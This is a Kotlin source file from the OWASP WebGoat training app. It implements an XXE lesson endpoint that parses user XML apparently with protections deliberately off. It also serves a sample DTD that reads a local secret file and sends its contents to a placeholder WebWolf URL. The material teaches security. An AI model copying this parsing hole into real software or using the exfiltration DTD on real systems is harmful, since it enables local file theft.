/*
 * SPDX-FileCopyrightText: Copyright © 2014 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.xxe

import org.apache.commons.exec.OS
import org.apache.commons.lang3.exception.ExceptionUtils
import org.owasp.webgoat.container.CurrentUser
import org.owasp.webgoat.container.assignments.AssignmentEndpoint
import org.owasp.webgoat.container.assignments.AssignmentHints
import org.owasp.webgoat.container.assignments.AttackResult
import org.owasp.webgoat.container.assignments.AttackResultBuilder.Companion.failed
import org.owasp.webgoat.container.assignments.AttackResultBuilder.Companion.success
import org.owasp.webgoat.container.users.WebGoatUser
import org.springframework.http.MediaType
import org.springframework.web.bind.annotation.PostMapping
import org.springframework.web.bind.annotation.RequestBody
import org.springframework.web.bind.annotation.RequestMapping
import org.springframework.web.bind.annotation.ResponseBody
import org.springframework.web.bind.annotation.RestController

@RestController
@AssignmentHints(
    "xxe.hints.simple.xxe.1",
    "xxe.hints.simple.xxe.2",
    "xxe.hints.simple.xxe.3",
    "xxe.hints.simple.xxe.4",
    "xxe.hints.simple.xxe.5",
    "xxe.hints.simple.xxe.6",
)
class SimpleXXE(
    private val comments: CommentsCache,
) : AssignmentEndpoint {
    companion object {
        private val DEFAULT_LINUX_DIRECTORIES = arrayOf("usr", "etc", "var")
        private val DEFAULT_WINDOWS_DIRECTORIES =
            arrayOf("Windows", "Program Files (x86)", "Program Files", "pagefile.sys")
    }

    @PostMapping(
        path = ["xxe/simple"],
        consumes = [MediaType.ALL_VALUE],
        produces = [MediaType.APPLICATION_JSON_VALUE],
    )
    @ResponseBody
    fun createNewComment(
        @RequestBody commentStr: String,
        @CurrentUser user: WebGoatUser,
    ): AttackResult {
        var error = ""
        try {
            val comment = comments.parseXml(commentStr, false)
            comments.addComment(comment, user, false)
            if (checkSolution(comment)) {
                return success(this).build()
            }
        } catch (e: Exception) {
            error = ExceptionUtils.getStackTrace(e)
        }
        return failed(this).output(error).build()
    }

    private fun checkSolution(comment: Comment): Boolean {
        val directoriesToCheck =
            if (OS.isFamilyMac() || OS.isFamilyUnix()) {
                DEFAULT_LINUX_DIRECTORIES
            } else {
                DEFAULT_WINDOWS_DIRECTORIES
            }
        return directoriesToCheck.any { directory ->
            comment.text?.contains(directory) == true
        }
    }

    @RequestMapping(
        path = ["/xxe/sampledtd"],
        consumes = [MediaType.ALL_VALUE],
        produces = [MediaType.TEXT_PLAIN_VALUE],
    )
    @ResponseBody
    fun getSampleDTDFile(): String =
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
        <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
        %all;
        """.trimIndent()
}
